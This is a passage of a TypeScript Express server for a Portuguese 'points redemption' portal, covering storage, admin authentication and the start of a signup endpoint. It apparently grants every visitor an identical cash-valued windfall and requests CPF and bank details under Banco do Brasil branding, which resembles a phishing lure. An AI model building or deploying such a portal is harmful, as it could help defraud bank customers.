import crypto from 'node:crypto';
import type { Express, NextFunction, Request, RequestHandler, Response } from 'express';
import type {
  ConsultaAdminRecord,
  ConsultaPublicResult,
  ExchangeOption,
  RedemptionPageConfig,
  SiteSettings,
} from '../types.ts';
import { CAMPAIGN_BRL_VALUE, CAMPAIGN_POINTS_GRANT } from '../utils/points.ts';
import {
  isValidBankAccount,
  isValidBankAgency,
  isValidBrPhone,
  isValidCpf,
  isValidFullName,
  isValidHexColor,
  isValidOptionalBankDigit,
  isValidRequiredBankDigit,
  maskBankAccount,
  maskBankAgency,
  maskCpf,
  maskPhone,
  normalizeFullName,
  onlyDigits,
} from '../utils/validation.ts';

export interface StoredLogo {
  mime: 'image/png' | 'image/jpeg' | 'image/webp';
  base64: string;
  revision: number;
}

export type StoredConsulta = ConsultaAdminRecord;

export interface PortalDataPayload {
  settings: Omit<SiteSettings, 'brandLogoUrl' | 'passcodeManagedByEnv'>;
  logo: StoredLogo | null;
  redemptionLogo?: StoredLogo | null;
  consultas: StoredConsulta[];
  adminPasscodeHash?: string;
}

export interface LocalStoreEnvelope {
  revision: number;
  data: PortalDataPayload;
}

export interface LocalStoreAdapter {
  read: () => LocalStoreEnvelope;
  write: (expectedRevision: number, nextData: PortalDataPayload) => number;
}

export interface RuntimeEnv {
  SUPABASE_URL?: string;
  SUPABASE_SECRET_KEY?: string;
  ADMIN_PASSCODE?: string;
  SESSION_SECRET?: string;
}

export interface CreatePortalAppOptions {
  app: Express;
  runtime: 'node' | 'cloudflare-worker';
  getEnv: () => RuntimeEnv;
  jsonParser?: RequestHandler;
  localStore?: LocalStoreAdapter;
}

export class RevisionConflictError extends Error {
  constructor(message = 'Os dados foram atualizados por outra operação simultânea. Tente novamente.') {
    super(message);
    this.name = 'RevisionConflictError';
  }
}

class StorageConfigError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'StorageConfigError';
  }
}

class StorageBackendError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'StorageBackendError';
  }
}

const MAX_JSON_BODY_BYTES = 4 * 1024 * 1024; // 4 MB

// Initial scrypt hash used strictly in local Node development when ADMIN_PASSCODE is not configured
export const INITIAL_LOCAL_ADMIN_HASH =
  '87e92f2d559cdd2391a399986e34f778:65713ac0b6e9fbbf9cbde0fa08719ba48a21fe86cc0c06300bf9eabbbad8485ff8f798f0aa69ba366693465211a6144f2ba4cbf131181fde6734e00ef5208e10';

const SALDO_CONTA_OPTION: ExchangeOption = {
  id: 'saldo-conta',
  title: 'Depósito em Conta Corrente',
  description: 'Solicitação de conversão fixa dos pontos da campanha para conta corrente',
  rateLabel: '45.811 pts = R$ 2.748,63',
};

const DEFAULT_EXCHANGE_OPTIONS: ExchangeOption[] = [SALDO_CONTA_OPTION];

export const DEFAULT_REDEMPTION_PAGE: Omit<RedemptionPageConfig, 'redemptionLogoUrl'> = {
  platformName: 'Pontos Legais',
  companyName: 'Programa Pontos Legais',
  backgroundColor: '#FFED00',
  title: 'Confirme seus dados para concluir sua solicitação de resgate.',
  subtitle: 'Informe os dados da conta corrente de sua titularidade para depósito.',
  infoText:
    'A solicitação será analisada e processada para a conta corrente informada. Nunca solicitamos senha bancária, código de autenticação ou token.',
  bankLabel: 'Banco do Brasil — 001',
  depositInstructions:
    'Informe agência, dígito da agência (quando aplicável), conta corrente e dígito da conta vinculados ao titular cadastrado.',
  showAgencyDigit: true,
  convertButtonText: 'CONVERTER PONTOS EM REAIS',
  ownershipButtonText: 'CONFIRMAR TITULARIDADE',
  requestButtonText: 'SOLICITAR RESGATE',
  confirmButtonText: 'CONFIRMAR RESGATE',
};

const DEFAULT_CORE_SETTINGS: Omit<SiteSettings, 'brandLogoUrl' | 'passcodeManagedByEnv'> = {
  brandName: 'Portal de Pontos',
  heroTitle: 'CONSULTE SEUS PONTOS',
  heroSubtitle: 'Realize sua consulta e confira seus pontos disponíveis para conversão em reais.',
  formHeading: 'CONSULTE SEUS PONTOS',
  pointsLabel: 'pontos',
  minPointsPreview: CAMPAIGN_POINTS_GRANT,
  maxPointsPreview: CAMPAIGN_POINTS_GRANT,
  exchangeOptions: DEFAULT_EXCHANGE_OPTIONS,
  redemptionPage: DEFAULT_REDEMPTION_PAGE,
};

function createUtf8JsonParser(limitBytes: number): RequestHandler {
  const decoder = new TextDecoder('utf-8', { fatal: true });

  return (req: Request, res: Response, next: NextFunction): void => {
    const method = req.method.toUpperCase();
    if (method === 'GET' || method === 'HEAD' || method === 'OPTIONS') {
      next();
      return;
    }

    if (req.body !== undefined) {
      next();
      return;
    }

    const contentLengthRaw = req.headers['content-length'];
    if (typeof contentLengthRaw === 'string') {
      const contentLength = Number(contentLengthRaw);
      if (Number.isFinite(contentLength) && contentLength > limitBytes) {
        res.status(413).json({ error: 'Corpo da requisição excede o limite de 4 MB.' });
        return;
      }
    }

    const contentType = String(req.headers['content-type'] || '').trim();
    const isJsonContentType =
      contentType === '' || /^application\/([a-z0-9.+-]+\+)?json(\s*;|$)/i.test(contentType);

    const chunks: Buffer[] = [];
    let totalBytes = 0;
    let settled = false;

    const finishError = (status: number, message: string) => {
      if (settled) return;
      settled = true;
      res.status(status).json({ error: message });
    };

    req.on('data', (chunk: unknown) => {
      if (settled) return;
      const buf = Buffer.isBuffer(chunk)
        ? chunk
        : typeof chunk === 'string'
          ? Buffer.from(chunk, 'utf8')
          : Buffer.from(chunk as Uint8Array);

      totalBytes += buf.length;
      if (totalBytes > limitBytes) {
        finishError(413, 'Corpo da requisição excede o limite de 4 MB.');
        return;
      }
      chunks.push(buf);
    });

    req.on('end', () => {
      if (settled) return;
      settled = true;

      if (totalBytes === 0) {
        req.body = {};
        next();
        return;
      }

      if (!isJsonContentType) {
        res.status(400).json({ error: 'Tipo de conteúdo inválido. Envie JSON UTF-8 válido.' });
        return;
      }

      let rawText: string;
      try {
        rawText = decoder.decode(Buffer.concat(chunks)).trim();
      } catch {
        res.status(400).json({ error: 'Codificação UTF-8 inválida no corpo da requisição.' });
        return;
      }

      if (rawText.length === 0) {
        req.body = {};
        next();
        return;
      }

      let parsed: unknown;
      try {
        parsed = JSON.parse(rawText);
      } catch {
        res.status(400).json({ error: 'JSON malformado no corpo da requisição.' });
        return;
      }

      if (parsed === null || typeof parsed !== 'object') {
        res.status(400).json({ error: 'O corpo JSON deve ser um objeto ou lista válida.' });
        return;
      }

      req.body = parsed;
      next();
    });

    req.on('error', () => {
      finishError(400, 'Erro ao ler o corpo da requisição.');
    });
  };
}

function isPrivateOrReservedHost(hostname: string): boolean {
  const host = hostname.toLowerCase().replace(/^\[|\]$/g, '');
  if (
    host === 'localhost' ||
    host === '127.0.0.1' ||
    host === '0.0.0.0' ||
    host === '::1' ||
    host === '169.254.169.254' ||
    host.endsWith('.local') ||
    host.endsWith('.internal')
  ) {
    return true;
  }

  const ipv4Match = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (ipv4Match) {
    const a = Number(ipv4Match[1]);
    const b = Number(ipv4Match[2]);
    if (a === 10 || a === 127 || a === 0) return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 169 && b === 254) return true;
  }

  if (host.includes(':')) {
    if (host === '::1' || host.startsWith('fc') || host.startsWith('fd') || host.startsWith('fe80')) {
      return true;
    }
  }

  return false;
}

function sanitizeConsultas(rawConsultas: unknown): StoredConsulta[] {
  if (!Array.isArray(rawConsultas)) return [];
  const clean: StoredConsulta[] = [];
  for (const item of rawConsultas) {
    if (!item || typeof item !== 'object') continue;
    const record = item as Record<string, unknown>;
    if ('cpfDigits' in record || 'cpfFormatted' in record || 'cpf' in record || 'bankPassword' in record) {
      continue;
    }
    if (
      typeof record.id !== 'string' ||
      typeof record.protocol !== 'string' ||
      typeof record.profileLabel !== 'string' ||
      typeof record.referenceCode !== 'string' ||
      typeof record.pointsAvailable !== 'number' ||
      (record.status !== 'consultado' && record.status !== 'troca_solicitada') ||
      typeof record.createdAt !== 'string'
    ) {
      continue;
    }

    clean.push({
      id: record.id,
      protocol: record.protocol,
      profileLabel: record.profileLabel,
      cpfHash: typeof record.cpfHash === 'string' ? record.cpfHash : undefined,
      cpfMasked: typeof record.cpfMasked === 'string' ? record.cpfMasked : '***.***.***-**',
      phoneMasked: typeof record.phoneMasked === 'string' ? record.phoneMasked : '(**) *****-****',
      referenceCode: record.referenceCode,
      pointsAvailable: CAMPAIGN_POINTS_GRANT,
      amountBrl:
        typeof record.amountBrl === 'number' && Number.isFinite(record.amountBrl)
          ? record.amountBrl
          : CAMPAIGN_BRL_VALUE,
      status: record.status,
      selectedOptionId: typeof record.selectedOptionId === 'string' ? record.selectedOptionId : null,
      selectedOptionTitle: typeof record.selectedOptionTitle === 'string' ? record.selectedOptionTitle : null,
      bankLabel: typeof record.bankLabel === 'string' ? record.bankLabel : null,
      agencyMasked: typeof record.agencyMasked === 'string' ? record.agencyMasked : null,
      accountMasked: typeof record.accountMasked === 'string' ? record.accountMasked : null,
      ownershipConfirmed: Boolean(record.ownershipConfirmed),
      createdAt: record.createdAt,
      exchangedAt: typeof record.exchangedAt === 'string' ? record.exchangedAt : null,
    });
  }
  return clean.slice(0, 250);
}

function sanitizeLogo(rawLogo: unknown): StoredLogo | null {
  if (!rawLogo || typeof rawLogo !== 'object') return null;
  const logo = rawLogo as Record<string, unknown>;
  if (
    (logo.mime === 'image/png' || logo.mime === 'image/jpeg' || logo.mime === 'image/webp') &&
    typeof logo.base64 === 'string' &&
    logo.base64.length > 0 &&
    typeof logo.revision === 'number'
  ) {
    return {
      mime: logo.mime,
      base64: logo.base64,
      revision: logo.revision,
    };
  }
  return null;
}

function sanitizeText(value: unknown, fallback: string, minLen: number, maxLen: number): string {
  if (typeof value !== 'string') return fallback;
  const trimmed = value.trim();
  if (trimmed.length < minLen) return fallback;
  return trimmed.slice(0, maxLen);
}

function sanitizeRedemptionPage(
  raw: unknown,
  current: Omit<RedemptionPageConfig, 'redemptionLogoUrl'> = DEFAULT_REDEMPTION_PAGE,
): Omit<RedemptionPageConfig, 'redemptionLogoUrl'> {
  const obj = raw && typeof raw === 'object' ? (raw as Record<string, unknown>) : {};
  const bg =
    typeof obj.backgroundColor === 'string' && isValidHexColor(obj.backgroundColor)
      ? obj.backgroundColor.trim().toUpperCase()
      : current.backgroundColor;

  return {
    platformName: sanitizeText(obj.platformName, current.platformName, 2, 60),
    companyName: sanitizeText(obj.companyName, current.companyName, 2, 80),
    backgroundColor: bg,
    title: sanitizeText(obj.title, current.title, 4, 140),
    subtitle: sanitizeText(obj.subtitle, current.subtitle, 4, 220),
    infoText: sanitizeText(obj.infoText, current.infoText, 4, 360),
    bankLabel: sanitizeText(obj.bankLabel, current.bankLabel, 2, 80),
    depositInstructions: sanitizeText(obj.depositInstructions, current.depositInstructions, 4, 300),
    showAgencyDigit:
      typeof obj.showAgencyDigit === 'boolean' ? obj.showAgencyDigit : current.showAgencyDigit,
    convertButtonText: sanitizeText(obj.convertButtonText, current.convertButtonText, 2, 50),
    ownershipButtonText: sanitizeText(obj.ownershipButtonText, current.ownershipButtonText, 2, 50),
    requestButtonText: sanitizeText(obj.requestButtonText, current.requestButtonText, 2, 50),
    confirmButtonText: sanitizeText(obj.confirmButtonText, current.confirmButtonText, 2, 50),
  };
}

export function normalizePortalData(raw: unknown, includeLocalHash: boolean): PortalDataPayload {
  const obj = raw && typeof raw === 'object' ? (raw as Record<string, unknown>) : {};
  const rawSettings =
    obj.settings && typeof obj.settings === 'object'
      ? (obj.settings as Record<string, unknown>)
      : {};

  const exchangeOptions =
    Array.isArray(rawSettings.exchangeOptions) && rawSettings.exchangeOptions.length > 0
      ? (rawSettings.exchangeOptions as ExchangeOption[])
      : DEFAULT_EXCHANGE_OPTIONS;

  const minPts =
    typeof rawSettings.minPointsPreview === 'number' && Number.isFinite(rawSettings.minPointsPreview)
      ? Math.max(100, Math.min(1000000, Math.round(rawSettings.minPointsPreview)))
      : DEFAULT_CORE_SETTINGS.minPointsPreview;

  const maxPts =
    typeof rawSettings.maxPointsPreview === 'number' && Number.isFinite(rawSettings.maxPointsPreview)
      ? Math.max(minPts, Math.min(1000000, Math.round(rawSettings.maxPointsPreview)))
      : Math.max(minPts, DEFAULT_CORE_SETTINGS.maxPointsPreview);

  const normalized: PortalDataPayload = {
    settings: {
      brandName:
        typeof rawSettings.brandName === 'string' && rawSettings.brandName.trim().length >= 2
          ? rawSettings.brandName.trim().slice(0, 60)
          : DEFAULT_CORE_SETTINGS.brandName,
      heroTitle:
        typeof rawSettings.heroTitle === 'string' && rawSettings.heroTitle.trim().length >= 4
          ? rawSettings.heroTitle.trim().slice(0, 120)
          : DEFAULT_CORE_SETTINGS.heroTitle,
      heroSubtitle:
        typeof rawSettings.heroSubtitle === 'string' && rawSettings.heroSubtitle.trim().length >= 4
          ? rawSettings.heroSubtitle.trim().slice(0, 260)
          : DEFAULT_CORE_SETTINGS.heroSubtitle,
      formHeading:
        typeof rawSettings.formHeading === 'string' && rawSettings.formHeading.trim().length >= 4
          ? rawSettings.formHeading.trim().slice(0, 100)
          : DEFAULT_CORE_SETTINGS.formHeading,
      pointsLabel:
        typeof rawSettings.pointsLabel === 'string' && rawSettings.pointsLabel.trim().length >= 2
          ? rawSettings.pointsLabel.trim().slice(0, 40)
          : DEFAULT_CORE_SETTINGS.pointsLabel,
      minPointsPreview: minPts,
      maxPointsPreview: maxPts,
      exchangeOptions,
      redemptionPage: sanitizeRedemptionPage(rawSettings.redemptionPage, DEFAULT_REDEMPTION_PAGE),
    },
    logo: sanitizeLogo(obj.logo),
    redemptionLogo: sanitizeLogo(obj.redemptionLogo),
    consultas: sanitizeConsultas(obj.consultas),
  };

  if (includeLocalHash) {
    normalized.adminPasscodeHash =
      typeof obj.adminPasscodeHash === 'string' && obj.adminPasscodeHash.includes(':')
        ? obj.adminPasscodeHash
        : INITIAL_LOCAL_ADMIN_HASH;
  }

  return normalized;
}

function buildSupabaseHeaders(secretKey: string, extra: Record<string, string> = {}): Record<string, string> {
  const headers: Record<string, string> = {
    apikey: secretKey,
    ...extra,
  };
  if (secretKey.split('.').length === 3) {
    headers.Authorization = `Bearer ${secretKey}`;
  }
  return headers;
}

async function extractSafeSupabaseError(response: globalThis.Response): Promise<string> {
  try {
    const raw = await response.text();
    const parsed = JSON.parse(raw) as { message?: unknown; code?: unknown };
    const msg = typeof parsed.message === 'string' ? parsed.message : '';
    const code = typeof parsed.code === 'string' ? parsed.code : '';
    const details = [code, msg].filter(Boolean).join(': ');
    return details ? ` (${details})` : '';
  } catch {
    return '';
  }
}

function hashPasscode(passcode: string): string {
  const salt = crypto.randomBytes(16).toString('hex');
  const derived = crypto.scryptSync(passcode, salt, 64).toString('hex');
  return `${salt}:${derived}`;
}

function signToken(payload: Record<string, unknown>, ttlSeconds: number, secret: string): string {
  const fullPayload = {
    ...payload,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + ttlSeconds,
  };
  const encoded = Buffer.from(JSON.stringify(fullPayload), 'utf-8').toString('base64url');
  const sig = crypto.createHmac('sha256', secret).update(encoded).digest('base64url');
  return `${encoded}.${sig}`;
}

function verifyToken(token: string, secret: string): Record<string, unknown> | null {
  if (!secret) return null;
  const parts = token.split('.');
  if (parts.length !== 2) return null;
  const [encoded, sig] = parts;
  const expectedSig = crypto.createHmac('sha256', secret).update(encoded).digest('base64url');
  const sigBuf = Buffer.from(sig);
  const expBuf = Buffer.from(expectedSig);
  if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) {
    return null;
  }
  try {
    const parsed = JSON.parse(Buffer.from(encoded, 'base64url').toString('utf-8')) as Record<string, unknown>;
    if (typeof parsed.exp !== 'number' || parsed.exp < Math.floor(Date.now() / 1000)) {
      return null;
    }
    return parsed;
  } catch {
    return null;
  }
}

function hashCpf(cpfDigits: string, secret: string): string {
  return crypto.createHmac('sha256', secret).update(`cpf:${cpfDigits}`).digest('hex');
}

function detectImageType(
  buffer: Buffer,
): { ext: 'png' | 'jpg' | 'webp'; mime: 'image/png' | 'image/jpeg' | 'image/webp' } | null {
  if (buffer.length < 12) return null;
  if (
    buffer[0] === 0x89 &&
    buffer[1] === 0x50 &&
    buffer[2] === 0x4e &&
    buffer[3] === 0x47 &&
    buffer[4] === 0x0d &&
    buffer[5] === 0x0a &&
    buffer[6] === 0x1a &&
    buffer[7] === 0x0a
  ) {
    return { ext: 'png', mime: 'image/png' };
  }
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) {
    return { ext: 'jpg', mime: 'image/jpeg' };
  }
  if (
    buffer.subarray(0, 4).toString('ascii') === 'RIFF' &&
    buffer.subarray(8, 12).toString('ascii') === 'WEBP'
  ) {
    return { ext: 'webp', mime: 'image/webp' };
  }
  return null;
}

function hasForbiddenFinancialFields(body: unknown): boolean {
  if (!body || typeof body !== 'object' || Array.isArray(body)) return false;
  const forbidden = [
    'password',
    'senha',
    'bankpassword',
    'senhabancaria',
    'token',
    'authcode',
    'codigoautenticacao',
    'pin',
    'cvv',
    'cvc',
    'taxa',
    'fee',
    'pixkey',
    'pixkeytype',
  ];
  return Object.keys(body as Record<string, unknown>).some((k) =>
    forbidden.includes(k.toLowerCase()),
  );
}

function toPublicConsultaResult(
  record: StoredConsulta,
  claimToken: string,
  alreadyRegistered = false,
): ConsultaPublicResult {
  return {
    id: record.id,
    protocol: record.protocol,
    profileLabel: record.profileLabel,
    cpfMasked: record.cpfMasked,
    phoneMasked: record.phoneMasked,
    referenceCode: record.referenceCode,
    pointsAvailable: record.pointsAvailable,
    amountBrl: record.amountBrl,
    status: record.status,
    selectedOptionTitle: record.selectedOptionTitle,
    bankLabel: record.bankLabel,
    agencyMasked: record.agencyMasked,
    accountMasked: record.accountMasked,
    ownershipConfirmed: record.ownershipConfirmed,
    createdAt: record.createdAt,
    exchangedAt: record.exchangedAt,
    claimToken,
    alreadyRegistered,
  };
}

function toAdminConsulta(record: StoredConsulta): ConsultaAdminRecord {
  const { cpfHash: _hiddenHash, ...safe } = record;
  return safe;
}

function sendErrorResponse(res: Response, err: unknown): void {
  if (err instanceof RevisionConflictError) {
    res.status(409).json({ error: err.message });
    return;
  }
  if (err instanceof StorageConfigError) {
    res.status(503).json({ error: err.message });
    return;
  }
  if (err instanceof StorageBackendError) {
    res.status(502).json({ error: err.message });
    return;
  }
  res.status(500).json({ error: 'Erro interno ao processar a solicitação.' });
}

export function createPortalApp(options: CreatePortalAppOptions): Express {
  const { app } = options;
  app.set('trust proxy', 1);

  const jsonMiddleware = options.jsonParser ?? createUtf8JsonParser(MAX_JSON_BODY_BYTES);
  app.use(jsonMiddleware);

  // Normalize body-parser errors in Node mode to consistent 400/413 JSON responses
  app.use((err: unknown, _req: Request, res: Response, next: NextFunction) => {
    if (!err || typeof err !== 'object') {
      next(err);
      return;
    }
    const e = err as { status?: number; statusCode?: number; type?: string };
    const status = e.status ?? e.statusCode;
    if (status === 413 || e.type === 'entity.too.large') {
      res.status(413).json({ error: 'Corpo da requisição excede o limite de 4 MB.' });
      return;
    }
    if (status === 400 || e.type === 'entity.parse.failed') {
      res.status(400).json({ error: 'JSON malformado no corpo da requisição.' });
      return;
    }
    next(err);
  });

  let lazyDevSessionSecret: string | null = null;
  const loginAttempts = new Map<string, { count: number; resetAt: number }>();

  function getDevFallbackSessionSecret(): string {
    if (!lazyDevSessionSecret) {
      lazyDevSessionSecret = crypto.randomBytes(32).toString('hex');
    }
    return lazyDevSessionSecret;
  }

  function isWorkerRuntime(): boolean {
    return options.runtime === 'cloudflare-worker';
  }

  function getSupabaseConfig(): { enabled: boolean; restEndpoint: string; secretKey: string } {
    const env = options.getEnv();
    const urlRaw = env.SUPABASE_URL?.trim() || '';
    const secretKey = env.SUPABASE_SECRET_KEY?.trim() || '';

    if (isWorkerRuntime()) {
      if (!urlRaw || !secretKey) {
        throw new StorageConfigError(
          'Configuração do Supabase obrigatória no Cloudflare Workers: defina SUPABASE_URL e SUPABASE_SECRET_KEY nos segredos do Worker.',
        );
      }
    } else {
      if (!urlRaw && !secretKey) {
        return { enabled: false, restEndpoint: '', secretKey: '' };
      }
      if (!urlRaw || !secretKey) {
        throw new StorageConfigError(
          'Configuração do Supabase incompleta: defina SUPABASE_URL e SUPABASE_SECRET_KEY em Settings > Secrets.',
        );
      }
    }

    let parsed: URL;
    try {
      parsed = new URL(urlRaw);
    } catch {
      throw new StorageConfigError('SUPABASE_URL inválida. Verifique a URL configurada nos segredos.');
    }

    if (parsed.protocol !== 'https:') {
      throw new StorageConfigError('SUPABASE_URL deve utilizar o protocolo HTTPS.');
    }

    if (isPrivateOrReservedHost(parsed.hostname)) {
      throw new StorageConfigError('SUPABASE_URL aponta para um endereço de rede inválido.');
    }

    const baseOrigin = parsed.origin.replace(/\/+$/, '');
    return {
      enabled: true,
      restEndpoint: `${baseOrigin}/rest/v1/portal_store`,
      secretKey,
    };
  }

  function requiresStrictSecrets(): boolean {
    if (isWorkerRuntime()) return true;
    const env = options.getEnv();
    return Boolean(env.SUPABASE_URL?.trim() || env.SUPABASE_SECRET_KEY?.trim());
  }

  function getAdminAuthConfig(): {
    ready: boolean;
    error?: string;
    sessionSecret: string;
    envPasscode: string;
  } {
    const env = options.getEnv();
    const envPasscode = env.ADMIN_PASSCODE?.trim() || '';
    const envSessionSecret = env.SESSION_SECRET?.trim() || '';

    if (requiresStrictSecrets()) {
      if (!envPasscode || !envSessionSecret) {
        return {
          ready: false,
          error: isWorkerRuntime()
            ? 'Autenticação administrativa indisponível no Worker: defina ADMIN_PASSCODE e SESSION_SECRET nos segredos do Worker.'
            : 'Autenticação administrativa indisponível em modo Supabase: defina ADMIN_PASSCODE e SESSION_SECRET em Settings > Secrets.',
          sessionSecret: '',
          envPasscode: '',
        };
      }
      return {
        ready: true,
        sessionSecret: envSessionSecret,
        envPasscode,
      };
    }

    return {
      ready: true,
      sessionSecret: envSessionSecret || getDevFallbackSessionSecret(),
      envPasscode,
    };
  }

  function getClaimSecret(): string {
    const env = options.getEnv();
    const envSessionSecret = env.SESSION_SECRET?.trim() || '';
    if (isWorkerRuntime()) {
      if (!envSessionSecret) {
        throw new StorageConfigError(
          'Segredo SESSION_SECRET obrigatório no Cloudflare Workers para emitir tokens de consulta.',
        );
      }
      return envSessionSecret;
    }
    return envSessionSecret || getDevFallbackSessionSecret();
  }

  function verifyPasscode(candidate: string, data: PortalDataPayload, envPasscode: string): boolean {
    if (envPasscode && envPasscode.length > 0) {
      const a = crypto.createHash('sha256').update(candidate).digest();
      const b = crypto.createHash('sha256').update(envPasscode).digest();
      return crypto.timingSafeEqual(a, b);
    }

    if (requiresStrictSecrets()) {
      return false;
    }

    const stored = data.adminPasscodeHash || INITIAL_LOCAL_ADMIN_HASH;
    const [salt, storedHex] = stored.split(':');
    if (!salt || !storedHex) return false;
    const derived = crypto.scryptSync(candidate, salt, 64);
    const storedBuf = Buffer.from(storedHex, 'hex');
    if (derived.length !== storedBuf.length) return false;
    return crypto.timingSafeEqual(derived, storedBuf);
  }

  async function readPortalState(): Promise<{ revision: number; data: PortalDataPayload }> {
    const sb = getSupabaseConfig();
    if (!sb.enabled) {
      if (!options.localStore) {
        throw new StorageConfigError('Armazenamento local indisponível neste runtime.');
      }
      const localEnvelope = options.localStore.read();
      return {
        revision: localEnvelope.revision,
        data: normalizePortalData(localEnvelope.data, true),
      };
    }

    let response: globalThis.Response;
    try {
      response = await fetch(`${sb.restEndpoint}?id=eq.1&select=id,revision,data`, {
        method: 'GET',
        headers: buildSupabaseHeaders(sb.secretKey, {
          Accept: 'application/json',
        }),
      });
    } catch {
      throw new StorageBackendError('Não foi possível conectar ao serviço Supabase configurado.');
    }

    if (!response.ok) {
      const detail = await extractSafeSupabaseError(response);
      throw new StorageBackendError(
        `Falha ao consultar armazenamento Supabase (HTTP ${response.status})${detail}.`,
      );
    }

    let rows: unknown;
    try {
      rows = await response.json();
    } catch {
      throw new StorageBackendError('Resposta inválida recebida do Supabase.');
    }

    if (!Array.isArray(rows) || rows.length === 0) {
      throw new StorageBackendError(
        'Linha id=1 não encontrada na tabela public.portal_store do Supabase.',
      );
    }

    const row = rows[0] as { revision?: unknown; data?: unknown };
    const revision = Number(row.revision);
    if (!Number.isFinite(revision)) {
      throw new StorageBackendError('Campo revision inválido no registro id=1 do Supabase.');
    }

    return {
      revision,
      data: normalizePortalData(row.data, false),
    };
  }

  async function mutatePortalState<T>(
    mutator: (data: PortalDataPayload) => { nextData: PortalDataPayload; result: T },
  ): Promise<{ revision: number; data: PortalDataPayload; result: T }> {
    const sb = getSupabaseConfig();
    const current = await readPortalState();
    const clonedData = JSON.parse(JSON.stringify(current.data)) as PortalDataPayload;
    const { nextData, result } = mutator(clonedData);

    if (!sb.enabled) {
      if (!options.localStore) {
        throw new StorageConfigError('Armazenamento local indisponível neste runtime.');
      }
      const nextRevision = options.localStore.write(current.revision, nextData);
      return { revision: nextRevision, data: nextData, result };
    }

    const { adminPasscodeHash: _unusedHash, ...supabaseData } = nextData;

    let response: globalThis.Response;
    try {
      response = await fetch(
        `${sb.restEndpoint}?id=eq.1&revision=eq.${encodeURIComponent(String(current.revision))}`,
        {
          method: 'PATCH',
          headers: buildSupabaseHeaders(sb.secretKey, {
            'Content-Type': 'application/json',
            Prefer: 'return=representation',
          }),
          body: JSON.stringify({
            revision: current.revision + 1,
            data: supabaseData,
          }),
        },
      );
    } catch {
      throw new StorageBackendError('Erro de rede ao salvar dados no Supabase.');
    }

    if (!response.ok) {
      const detail = await extractSafeSupabaseError(response);
      throw new StorageBackendError(
        `Falha ao persistir dados no Supabase (HTTP ${response.status})${detail}.`,
      );
    }

    let updatedRows: unknown;
    try {
      updatedRows = await response.json();
    } catch {
      throw new StorageBackendError('Resposta inválida ao confirmar atualização no Supabase.');
    }

    if (!Array.isArray(updatedRows) || updatedRows.length === 0) {
      throw new RevisionConflictError();
    }

    const updated = updatedRows[0] as { revision?: unknown };
    const nextRevision = Number(updated.revision ?? current.revision + 1);
    return { revision: nextRevision, data: nextData, result };
  }

  function toPublicSettings(data: PortalDataPayload): SiteSettings {
    const env = options.getEnv();
    return {
      ...data.settings,
      brandLogoUrl: data.logo ? `/api/logo?v=${data.logo.revision}` : null,
      redemptionPage: {
        ...data.settings.redemptionPage,
        redemptionLogoUrl: data.redemptionLogo
          ? `/api/redemption-logo?v=${data.redemptionLogo.revision}`
          : null,
      },
      passcodeManagedByEnv: requiresStrictSecrets() || Boolean(env.ADMIN_PASSCODE?.trim()),
    };
  }

  function requireAdminAuth(req: Request, res: Response, next: NextFunction): void {
    const authCfg = getAdminAuthConfig();
    if (!authCfg.ready) {
      res.status(503).json({ error: authCfg.error });
      return;
    }

    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      res.status(401).json({ error: 'Autenticação necessária.' });
      return;
    }

    const token = authHeader.slice('Bearer '.length).trim();
    const payload = verifyToken(token, authCfg.sessionSecret);
    if (!payload || payload.role !== 'admin') {
      res.status(401).json({ error: 'Sessão expirada ou inválida. Entre novamente.' });
      return;
    }
    next();
  }

  function checkRateLimit(ip: string): boolean {
    const now = Date.now();
    const record = loginAttempts.get(ip);
    if (!record || record.resetAt < now) {
      loginAttempts.set(ip, { count: 0, resetAt: now + 15 * 60 * 1000 });
      return true;
    }
    return record.count < 15;
  }

  function recordFailedLogin(ip: string): void {
    const now = Date.now();
    const record = loginAttempts.get(ip);
    if (!record || record.resetAt < now) {
      loginAttempts.set(ip, { count: 1, resetAt: now + 15 * 60 * 1000 });
    } else {
      record.count += 1;
    }
  }

  function clearLoginAttempts(ip: string): void {
    loginAttempts.delete(ip);
  }

  // Public settings
  app.get('/api/settings', async (_req, res) => {
    try {
      const { data } = await readPortalState();
      res.json(toPublicSettings(data));
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Serve persisted logo safely from store
  app.get('/api/logo', async (_req, res) => {
    try {
      const { data } = await readPortalState();
      if (!data.logo) {
        res.status(404).json({ error: 'Logo não configurada.' });
        return;
      }
      const buffer = Buffer.from(data.logo.base64, 'base64');
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('Content-Type', data.logo.mime);
      res.setHeader('Cache-Control', 'public, max-age=3600');
      res.send(buffer);
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Serve persisted redemption platform logo safely from store
  app.get('/api/redemption-logo', async (_req, res) => {
    try {
      const { data } = await readPortalState();
      const targetLogo = data.redemptionLogo ?? data.logo;
      if (!targetLogo) {
        res.status(404).json({ error: 'Logotipo da plataforma não configurado.' });
        return;
      }
      const buffer = Buffer.from(targetLogo.base64, 'base64');
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('Content-Type', targetLogo.mime);
      res.setHeader('Cache-Control', 'public, max-age=3600');
      res.send(buffer);
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Etapa 1 -> Etapa 2: Validar dados cadastrais e conceder benefício fixo da campanha (sem duplicidade por CPF)
  app.post('/api/consultas', async (req, res) => {
    if (hasForbiddenFinancialFields(req.body)) {
      res.status(400).json({ error: 'Dados bancários sensíveis não são permitidos.' });
      return;
    }

    const body = (req.body && typeof req.body === 'object' ? req.body : {}) as {
      fullName?: unknown;
      cpf?: unknown;
      phone?: unknown;
      acceptedPrivacy?: unknown;
    };

    const fullName = typeof body.fullName === 'string' ? normalizeFullName(body.fullName) : '';
    const cpfRaw = typeof body.cpf === 'string' ? body.cpf : '';
    const phoneRaw = typeof body.phone === 'string' ? body.phone : '';
    const acceptedPrivacy = body.acceptedPrivacy === true;

    if (!isValidFullName(fullName)) {
